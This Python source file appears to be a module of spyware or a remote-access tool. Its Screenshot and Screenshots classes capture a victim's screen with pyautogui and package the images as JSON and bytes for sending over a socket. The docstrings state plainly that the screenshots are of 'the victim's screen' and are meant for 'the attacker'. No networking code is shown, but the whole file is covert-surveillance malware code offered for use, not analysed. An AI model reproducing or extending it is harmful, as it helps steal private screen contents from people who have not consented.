import pyautogui
import datetime
import os
import warnings
from typing import List, Optional, Iterable, Union
import json


class Screenshot:
    """A class for representing a screenshot of the victim's screen that will be sent to the attacker"""

    def __init__(self, path: str = None, image=None, date=None):
        if path is None:
            path = os.getcwd()
        elif os.path.exists(path):
            warnings.warn("Overriding a screenshot in the same directory..")

        self._path = path
        self._date = datetime.datetime.now() if date is None else date
        self._image = pyautogui.screenshot(path) if image is None else image

    @property
    def path(self):
        return self._path

    @property
    def creation_date(self):
        return self._date

    @property
    def image(self):
        return self._image

    def to_bytes(self):
        with open(self._path, "rb") as image_file:
            bytes_content = image_file.read()

        return bytes_content

    def change_path(self):  # TODO: later on, maybe we will want to change the path of the
        pass

    def to_dict(self):
        return {
            "path": f"{self._path}",
            "day": f"{self._date.day}",
            "month": f"{self._date.month}",
            "year": f"{self._date.year}"
        }

    def to_json(self):
        """Convert the object to json, so it can be transferred via the socket"""
        return json.dumps(self.to_dict())


class Screenshots:
    """ A class for representing a list of screenshots of the victim's machine that will be sent to the attacker """

    def __init__(self, screenshots: "Optional[List[Screenshot]]" = None):
        if screenshots is None:
            self._screenshots = []
            return  # we can break from the method

        elif isinstance(screenshots, list):
            self._screenshots = screenshots
        else:
            raise TypeError(f"Invalid type {type(screenshots)} in Screenshots.__init__()")

    @property
    def screenshots(self):
        return self._screenshots

    def to_dict(self):
        return [screenshot.to_dict() for screenshot in self._screenshots]

    def to_json(self):
        return json.dumps(self.to_dict())

    def to_bytes_array(self):
        return [screenshot.to_bytes() for screenshot in self._screenshots]


def main():
    my_screenshot = Screenshot("my_screenshot.png")


if __name__ == '__main__':
    main()
